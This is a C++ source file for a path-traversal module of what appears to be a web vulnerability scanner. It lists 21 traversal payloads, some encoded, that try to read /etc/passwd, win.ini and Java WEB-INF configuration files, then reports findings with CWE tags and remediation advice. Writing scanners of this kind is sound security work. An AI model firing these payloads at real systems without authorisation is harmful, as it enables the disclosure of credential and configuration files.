#include "../scanner_module.hpp"

#include "../../../../helpers/diag_log.hpp"

#include <optional>
#include <regex>
#include <string>
#include <vector>

namespace aida {
namespace burp {
namespace scanner {

namespace {

std::vector<probe_t> traversal_probes(const insertion_point_t& ip, const module_context_t&)
{
    diag::log_tagged_fmt("mod_path_trav", "traversal_probes entry ip=%s:%s orig=%s",
                         ip.kind.c_str(), ip.name.c_str(), ip.original_value.c_str());
    std::vector<probe_t> out;
    out.push_back({"../../../../etc/passwd",                           "root:", "unix-dotdot"});
    out.push_back({"..%2f..%2f..%2f..%2fetc%2fpasswd",                 "root:", "unix-pctencoded"});
    out.push_back({"..%252f..%252f..%252fetc%252fpasswd",              "root:", "unix-double-pct"});
    out.push_back({"....//....//....//etc/passwd",                     "root:", "unix-quad-dot"});
    out.push_back({"..\\..\\..\\..\\windows\\win.ini",                 "[fonts]", "win-backslash"});
    out.push_back({"..%5c..%5c..%5c..%5cwindows%5cwin.ini",            "[fonts]", "win-pctencoded"});
    out.push_back({"/etc/passwd",                                       "root:", "unix-absolute"});
    out.push_back({"c:\\windows\\win.ini",                              "[fonts]", "win-absolute"});
    out.push_back({"../../WEB-INF/web.xml",                             "<web-app", "java-webxml-dotdot"});
    out.push_back({"..%2f..%2fWEB-INF%2fweb.xml",                       "<web-app", "java-webxml-pct"});
    out.push_back({"..%252f..%252fWEB-INF%252fweb.xml",                 "<web-app", "java-webxml-double-pct"});
    out.push_back({"WEB-INF/web.xml",                                   "<web-app", "java-webxml-relative"});
    out.push_back({"/WEB-INF/web.xml",                                  "<web-app", "java-webxml-absolute"});
    out.push_back({"..;/WEB-INF/web.xml",                               "<web-app", "tomcat-semicolon-webxml"});
    out.push_back({"/..;/WEB-INF/web.xml",                              "<web-app", "tomcat-root-semicolon-webxml"});
    out.push_back({"%2e%2e%3b/WEB-INF/web.xml",                         "<web-app", "tomcat-encoded-semicolon-webxml"});
    out.push_back({"../../WEB-INF/classes/application.properties",       "spring.datasource", "java-classes-app-props"});
    out.push_back({"../../WEB-INF/classes/log4j.properties",             "log4j.", "java-classes-log4j"});
    out.push_back({"../../WEB-INF/classes/struts.xml",                   "<struts", "java-classes-struts"});
    out.push_back({"../../META-INF/MANIFEST.MF",                         "Manifest-Version", "java-manifest-dotdot"});
    out.push_back({"..%2f..%2fMETA-INF%2fMANIFEST.MF",                   "Manifest-Version", "java-manifest-pct"});
    (void)ip;
    diag::log_tagged_fmt("mod_path_trav", "traversal_probes built %zu probes ip=%s:%s", out.size(), ip.kind.c_str(), ip.name.c_str());
    return out;
}

bool webxml_admin_exposure(const exchange_observed_t& resp, std::string& evidence)
{
    if (!body_contains_ci(resp, "<web-app") &&
        !body_contains_ci(resp, "<filter-mapping") &&
        !body_contains_ci(resp, "<url-pattern"))
        return false;
    const bool has_admin_filter = body_contains_ci(resp, "AdminFilter");
    const bool typo_mapping = body_contains_ci(resp, "/adimn/*") || body_contains_ci(resp, "/adimn/") || body_contains_ci(resp, "adimn");
    const bool admin_mapping = body_contains_ci(resp, "/admin/*") || body_contains_ci(resp, "/admin/");
    if (!has_admin_filter && !typo_mapping)
        return false;
    evidence = "web.xml leaked servlet filter mapping";
    if (has_admin_filter) evidence += "; AdminFilter present";
    if (typo_mapping) evidence += "; typo mapping /adimn observed";
    if (admin_mapping) evidence += "; admin mapping observed";
    return true;
}

std::optional<issue_t> traversal_detect(const insertion_point_t& ip, const probe_t& probe,
                                        const exchange_observed_t& resp, const module_context_t& ctx)
{
    diag::log_tagged_fmt("mod_path_trav", "traversal_detect entry ip=%s:%s variant=%s status=%d",
                         ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str(), resp.status_code);
    if (probe.marker.empty()) {
        diag::log_tagged_fmt("mod_path_trav", "traversal_detect skip empty marker ip=%s:%s", ip.kind.c_str(), ip.name.c_str());
        return std::nullopt;
    }
    const bool webxml_variant = probe.variant.find("webxml") != std::string::npos;
    const bool marker_found = body_contains_ci(resp, probe.marker);
    const bool webxml_found = webxml_variant &&
        (body_contains_ci(resp, "<web-app") || body_contains_ci(resp, "<filter-mapping") || body_contains_ci(resp, "<url-pattern"));
    if (!marker_found && !webxml_found) {
        diag::log_tagged_fmt("mod_path_trav", "traversal_detect marker not in body ip=%s:%s variant=%s", ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str());
        return std::nullopt;
    }
    diag::log_tagged_fmt("mod_path_trav", "traversal_detect FINDING file-read ip=%s:%s variant=%s marker=%s",
                         ip.kind.c_str(), ip.name.c_str(), probe.variant.c_str(), probe.marker.c_str());
    std::string admin_evidence;
    if (webxml_admin_exposure(resp, admin_evidence)) {
        diag::log_tagged_fmt("mod_path_trav", "traversal_detect FINDING admin-filter-exposure ip=%s:%s evidence=%s",
                             ip.kind.c_str(), ip.name.c_str(), admin_evidence.c_str());
        auto admin = make_issue("access-control.admin-filter-webxml-exposure",
                                "Admin filter mapping exposed through web.xml",
                                severity_t::high, confidence_t::certain, ip, probe, resp, ctx,
                                admin_evidence);
        admin.description = "The leaked web.xml reveals an admin filter or typo-prone admin mapping, indicating admin access control can be audited directly and may expose a public admin path.";
        admin.remediation = "Correct admin URL mappings, protect every admin route with server-side authorization, and prevent WEB-INF resources from being served through user-controlled paths.";
        admin.cwe.push_back("CWE-284");
        admin.cwe.push_back("CWE-425");
        issue_store::add(std::move(admin));
    }
    auto iss = make_issue("path-traversal.file-read", "Path Traversal / Local File Inclusion",
                          severity_t::high, confidence_t::firm, ip, probe, resp, ctx,
                          std::string("Sensitive file content marker observed: ") + (marker_found ? probe.marker : "web.xml servlet descriptor"));
    iss.description = std::string("The parameter '") + ip.name +
        "' permitted path-traversal sequences and returned the contents of a sensitive OS file.";
    iss.remediation = "Resolve paths to a canonical form and verify they sit under an expected base directory; reject any traversal sequences before resolution.";
    iss.cwe.push_back("CWE-22");
    return iss;
}

bool register_self()
{
    module_t m;
    m.id = "path-traversal";
    m.name = "Path Traversal";
    m.category = "File Access";
    m.max_probes_per_point = 21;
    m.probes = traversal_probes;
    m.detect = traversal_detect;
    return register_module(std::move(m));
}

const bool s_registered = register_self();

}

}
}
}
